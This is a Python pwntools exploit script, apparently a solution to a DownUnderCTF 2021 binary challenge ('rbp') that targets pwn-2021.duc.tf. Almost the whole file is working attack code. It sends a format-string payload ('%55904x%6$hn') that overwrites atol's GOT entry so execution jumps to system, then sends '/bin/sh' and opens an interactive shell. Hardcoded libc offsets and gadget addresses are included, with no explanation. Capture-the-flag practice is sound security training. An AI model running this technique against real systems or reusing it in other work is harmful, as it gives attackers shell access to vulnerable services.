from pwn import *

debug = True

if(debug):
	r = process("./rbp")
	#gdb.attach(r)
	atol_off = 0x0000000000047750
	system_off = 0x0000000000055410
else:
	r = remote("pwn-2021.duc.tf", 31910)
	atol_off = 0x0000000000042210
	system_off = 0x000000000004fa60
	puts_off = 0x0000000000809d0

r.recvuntil(b'Hi there! What is your name?')

atol_got = 0x000000000404038
main = 0x4011d5
read_long = 0x4011a9
read_long = 0x0000000000401239
read_long = 0x40122f # call printf
pop3_ret = 0x00000000004012af
printf = 0x401040
_start = 0x401080
fini = 0x403e08


payload1 = p64(printf) + p64(_start) + p64(atol_got) 
r.send(payload1) 
r.recvuntil(b'Do you have a favourite number?')

# 6 6752 2656 10848  14944  19040  23136 43616  60000  55904
payload2 = b"-72" + b"%55904x" + b"%6$hn" + b'\x00' 
payload2 += p64(pop3_ret)[:3]
r.send(payload2)



payload3 = b"/bin/sh\x00"
#payload3 += b'b'*(0x13 - len(payload3))

r.sendline(payload3)



r.interactive()
